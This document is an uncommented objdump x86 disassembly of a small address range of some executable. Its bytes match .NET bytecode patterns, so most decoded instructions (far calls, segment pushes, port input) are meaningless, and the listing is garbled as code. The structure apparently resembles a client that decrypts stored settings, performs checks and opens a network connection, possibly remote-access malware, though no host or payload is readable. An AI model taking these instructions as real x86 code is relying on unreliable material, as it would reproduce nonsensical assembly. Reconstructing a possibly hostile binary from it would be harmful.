  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	6a 01                	push   $0x1
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	1d 02 00 70 80       	sbb    $0x80700002,%eax
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	d0 02                	rolb   $1,(%edx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	83 03 00             	addl   $0x0,(%ebx)
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	97                   	xchg   %eax,%edi
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	bf 03 00 70 80       	mov    $0x80700003,%edi
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	cc                   	int3
  40291e:	04 00                	add    $0x0,%al
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	27                   	daa
  402928:	17                   	pop    %ss
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	da 1e                	ficompl (%esi)
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	8d 1f                	lea    (%edi),%ebx
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	40                   	inc    %eax
  402946:	20 00                	and    %al,(%eax)
  402948:	70 80                	jo     0x4028ca
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	f3 20 00             	repz and %al,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	f7 20                	mull   (%eax)
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	aa                   	stos   %al,%es:(%edi)
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 b4 21 00       	add    $0x21b472,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	b4 21                	mov    $0x21,%ah
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 b6 21    	add    %esp,0x21b67216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
